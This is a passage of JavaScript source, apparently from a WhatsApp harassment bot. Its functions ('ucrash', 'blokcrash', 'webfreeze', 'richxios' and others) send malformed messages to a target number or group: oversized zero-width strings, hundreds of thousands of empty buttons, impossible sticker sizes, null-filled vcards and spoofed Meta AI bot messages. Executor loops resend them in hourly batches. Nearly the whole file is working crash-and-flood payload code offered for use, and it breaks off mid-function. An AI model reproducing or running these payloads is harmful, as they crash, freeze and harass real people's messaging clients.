          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonRichBlokDelay(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayStupidGc(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

      const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "\u200B".repeat(50000) },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 100000 }, () => ({}))
                    }
                }
            }
        }
    };

    await userSock.relayMessage(target, msg, { isSecret: true });
        console.log(chalk.green(`ucrashgc sent to ${target}`));
  } catch (err) {
  console.error(`Error in ucrashgc for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonDelayStupidGcExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayStupidGc(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in ucrashgc: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayStupid(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

      const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "\u200B".repeat(50000) },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 100000 }, () => ({}))
                    }
                }
            }
        }
    };

    await userSock.relayMessage(target, msg, { isSecret: true });
        console.log(chalk.green(`ucrashv2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in ucrashv2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonDelayStupidExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayStupid(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

//ucrash
async function xeonUnifiedXstickerReaction(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

      await userSock.relayMessage(target, { 
    stickerMessage: {
      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      mimetype: "image/webp",
      height: 4294967295,
      width: 4294967295,
      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
      fileLength: 9007199254740991,
      mediaKeyTimestamp: 9007199254740991,
      firstFrameLength: 4294967295,
      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      isAnimated: true,
      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      contextInfo: {
        mentionedJid: [target],
        quotedMessage: {
          contactMessage: {
            displayName: " ",
            vcard: "\u0000".repeat(45000)
          }
        }
      },
      stickerSentTs: 9007199254740991,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "ꦾ".repeat(30000)
    }
  }, { isSecret: true });

  await userSock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Telegram: @dgxeon13" // S7 💀
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})) //FUCK RAM
          },
          contextInfo: {
            quotedMessage: {
              contactMessage: {
                displayName: " ",
                vcard: "Telegram: @dgxeon13"
              }
            }
          }
        }
      }
    }
  }, { isSecret: true });

  await userSock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Telegram: @dgxeon13",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u2062".repeat(30000),
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              contactMessage: {
                displayName: " ",
                vcard: "Telegram: @dgxeon13"
              }
            }
          }
        }
      }
    }
  }, { isSecret: true });
        console.log(chalk.green(`ucrash sent to ${target}`));
  } catch (err) {
  console.error(`Error in ucrash for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUnifiedXstickerReactionExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUnifiedXstickerReaction(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonCrashXFreeze(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

      const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        bloksWidget: {
                            data: "駭客攻擊",
                            fallback: "駭客攻擊"
                        },
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0,
                            name: "駭客攻擊",
                            address: "駭客攻擊",
                            jpegThumbnail: "sex"
                        }
                    },
                    body: {
                        text: "</>"
                    },
                    nativeFlowMessage: {
                        buttons: "$repeat({,500000)",
                        messageVersion: 3
                    }
                }
            }
        }
    };

    await userSock.relayMessage(target, msg, {});
        console.log(chalk.green(`matchcrash sent to ${target}`));
  } catch (err) {
  console.error(`Error in matchcrash for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonCrashXFreezeExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonCrashXFreeze(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonStickerWebWaKiller(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}
          await userSock.relayMessage('status@broadcast', {
            "stickerPackMessage": {
              "stickerPackId": "3809d279-8380-46ec-a4aa-9f88bb8d331b",
              "name": "",
              "publisher": "",
              "stickers": "{".repeat(999999),
              "fileLength": "1",
              "fileSha256": "zBQ67xYtACV6INue4Uxlh8RbVqnpjGDBCRVyWkND9ZQ=",
              "fileEncSha256": "XS417sLbPEdz4LPbTSdsM0dGkVGWiVy2tAmIuixjlh0=",
              "mediaKey": "TaFFlOgV3RjLTpD+nXregBe7nMFLjmKlJE4N2MY4B9M=",
              "directPath": "/v/t62.15575-24/536941729_1742324930142466_6493043607786673721_n.enc?ccb=11-4&oh=01_Q5Aa5QGF3j7pDlBS5O2CsjeUX9NCVTQvgbIn-f6ZVlmFwlUojQ&oe=6AA0A50E&_nc_sid=5e03e0",
            }
          }, {
            statusJidList: [target],
            additionalNodes: [
              { tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [target].map(x => ({ tag: "to", attrs: { jid: x } })) }] }
            ]
          })
        console.log(chalk.green(`webfreeze sent to ${target}`));
  } catch (err) {
  console.error(`Error in webfreeze for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonRichIosV2(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

const buffer1 = {
  "interactiveMessage": {
    "interactiveMessage": {
      "header": {
        "title": "Telegram: @dgxeon13",
        "subtitle": "Telegram: @dgxeon13",
        "hasMediaAttachment": false
      },
      "body": {
        "text": "Telegram: @dgxeon13"
      },
      "footer": {
        "text": "Telegram: @dgxeon13"
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "quick_reply",
            "buttonParamsJson": "{\"display_text\":\"Telegram: @dgxeon13 1\",\"id\":\"opt_1\"}"
          },
          {
            "name": "quick_reply",
            "buttonParamsJson": "{\"display_text\":\"Telegram: @dgxeon13 3\",\"id\":\"opt_3\"}"
          }
        ],
        "messageParamsJson": "{}"
      },
      "mtype": "interactiveMessage",
      "id": "3EB002CBD0A177798DC757",
      "chat": "135759822622788@lid",
      "isBaileys": false,
      "sender": "215178549395532@lid",
      "fromMe": false,
      "text": "",
      "mentionedJid": [],
      "fakeObj": {
        "messageStubParameters": [],
        "labels": [],
        "userReceipt": [],
        "reactions": [],
        "pollUpdates": [],
        "eventResponses": [],
        "statusMentions": [],
        "messageAddOns": [],
        "statusMentionSources": [],
        "supportAiCitations": [],
        "key": "[SENSITIVE_DATA_OMITTED]",
        "message": {
          "interactiveMessage": {
            "header": {
              "title": "Telegram: @dgxeon13",
              "subtitle": "Telegram: @dgxeon13",
              "hasMediaAttachment": false
            },
            "body": {
              "text": "Telegram: @dgxeon13"
            },
            "footer": {
              "text": "Nishiki"
            },
            "nativeFlowMessage": {
              "buttons": [
                "[TRUNCATED_DEPTH]",
                "[TRUNCATED_DEPTH]"
              ],
              "messageParamsJson": "{}"
            },
            "mtype": "interactiveMessage",
            "id": "3EB002CBD0A177798DC757",
            "chat": "135759822622788@lid",
            "isBaileys": false,
            "sender": "215178549395532@lid",
            "fromMe": false,
            "text": "",
            "mentionedJid": [],
            "fakeObj": {
              "messageStubParameters": [],
              "labels": [],
              "userReceipt": [],
              "reactions": [],
              "pollUpdates": [],
              "eventResponses": [],
              "statusMentions": [],
              "messageAddOns": [],
              "statusMentionSources": [],
              "supportAiCitations": [],
              "key": "[SENSITIVE_DATA_OMITTED]",
              "message": {
                "interactiveMessage": "[TRUNCATED_DEPTH]"
              }
            },
            "delete": "[FUNCTION]",
            "copyNForward": "[FUNCTION]",
            "download": "[FUNCTION]"
          }
        }
      },
      "delete": "[FUNCTION]",
      "copyNForward": "[FUNCTION]",
      "download": "[FUNCTION]"
    }
  }
}

let data;
try {
  data = JSON.stringify(buffer1, null, 2);
} catch (stringifyErr) {
  console.error(stringifyErr.message);
}

const buffer = Buffer.from(data, 'utf8');

  const tora = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
          submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "Telegram: @dgxeon13" }],

          unifiedResponse: {
            data: Buffer.from(JSON.stringify({
              response_id: "Telegram: @dgxeon13",
              sections: [{
                view_model: {
                  primitive: {
                    text: "",
                    __typename: "GenAIMarkdownTextUXPrimitive"
                  },
                  __typename: "GenAISingleLayoutViewModel"
                }
              }, {
                view_model: {
                  primitive: {
                    language: "Gunma",
                    //===================CODE BLOCKS===================\\
                    code_blocks: [
                      { "content": "Telegram: @dgxeon13\n\n\n", "type": "NUMBER" },
                      //{ "content": "biranta", "type": "DEFAULT" }//GRAY
                      //{ "content": "biranta", "type": "KEYWORD" }//BLUE
                      //{ "content": "lang", "type": "METHOD" }, //ORANGE
                      { "content": buffer, "type": "STR" }    //GREEN
                      //{ "content": "5", "type": "NUMBER" }     //RED
                    ],
                    //===================CODE BLOCKS===================\\
                    __typename: "GenAICodeUXPrimitive"
                  },
                  __typename: "GenAISingleLayoutViewModel"
                }
              }, {
                view_model: {
                  primitive: {
                    text: "",
                    __typename: "GenAIMarkdownTextUXPrimitive"
                  },
                  __typename: "GenAISingleLayoutViewModel"
                }
              }
              ]
            }
            )).toString("base64")
          },
          contextInfo: {
            forwardingScore: 1, isForwarded: true,
            forwardedAiBotMessageInfo: {
              botName: "Meta AI",
              botJid: "13135550002@s.whatsapp.net", creatorName: "Meta"
            }
          }
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, tora, {})
  userSock.relayMessage(target, msg.message, { messageId: msg.key.id, isSecret: true });
        console.log(chalk.green(`richxiosv2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in richxiosv2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonNewBloksWidgetCrashGC(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

const R = 50000;

    for (let i = 0; i < 75; i++) {
      const content = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                bloksWidget: {
                  fallback: "\u200D".repeat(R),
                  type:     "\u200F".repeat(R),
                  data:     "[".repeat(R),
                  uuid:     "\u200B".repeat(R),
                },
                subtitle: "\u0010".repeat(R),
                title:    "X".repeat(R),
              },
              nativeFlowMessage: { buttons: [{}] },
              body: { text: "\u000F" },
            },
          },
        },
      };

      const message = generateWAMessageFromContent(target, content, {});

      await userSock.relayMessage(target, message.message, {
        messageId: message.key.id,
      });
      }
        console.log(chalk.green(`blokcrashgc sent to ${target}`));
  } catch (err) {
  console.error(`Error in blokcrashgc for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonNewBloksWidgetCrashGCExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonNewBloksWidgetCrashGC(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in androidgc: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonNewBloksWidgetCrash(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

const R = 50000;

    for (let i = 0; i < 75; i++) {
      const content = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                bloksWidget: {
                  fallback: "\u200D".repeat(R),
                  type:     "\u200F".repeat(R),
                  data:     "[".repeat(R),
                  uuid:     "\u200B".repeat(R),
                },
                subtitle: "\u0010".repeat(R),
                title:    "X".repeat(R),
              },
              nativeFlowMessage: { buttons: [{}] },
              body: { text: "\u000F" },
            },
          },
        },
      };

      const message = generateWAMessageFromContent(target, content, {});

      await userSock.relayMessage(target, message.message, {
        messageId: message.key.id,
        isSecret: true,
      });
      }
        console.log(chalk.green(`blokcrash sent to ${target}`));
  } catch (err) {
  console.error(`Error in blokcrash for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonNewBloksWidgetCrashExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonNewBloksWidgetCrash(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUnifiedRichResponseMessage(sock, target, userNumber, chatId, botInstance) {
    const startTime = Date.now();
    const runDuration = 1 * 60 * 60 * 1000; // 1 hour as in your original

    try {
        while (Date.now() - startTime < runDuration) {
            // ===== FIXED: Support both rent-session and web-session =====
      const currentSock = sock || sessions.get(userNumber) || webSessions.get(userNumber);

      if (!currentSock) {
        console.log(chalk.yellow(`[STOPPED] richxios stopped for ${target} - session invalid`));
        break;
      }

            // ONLY ADDED: Extra safety if sock is gone
            if (!sock || !sessions.has(userNumber)) {
                break;
            }

            // === EVERYTHING BELOW IS 100% YOUR ORIGINAL CODE ===
            await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "Telegram: @dgxeon13",
                        inline_entities: ["{".repeat(500000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      participant: { jid: target } 
    })

            console.log(chalk.green(`richxios sent to ${target}`));

        }
    } catch (error) {
        // Silent to avoid console spam (your original had console.log(error))
    }
}

async function xeonUnifiedRichResponseMessage2(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

await userSock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "Telegram: @dgxeon13",
                        inline_entities: ["{".repeat(500000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      participant: {jid:target}
    })
        console.log(chalk.green(`richxios2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in richxios2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonExtentedTextMessageV2(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

const HeyImage = {
    image: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0"
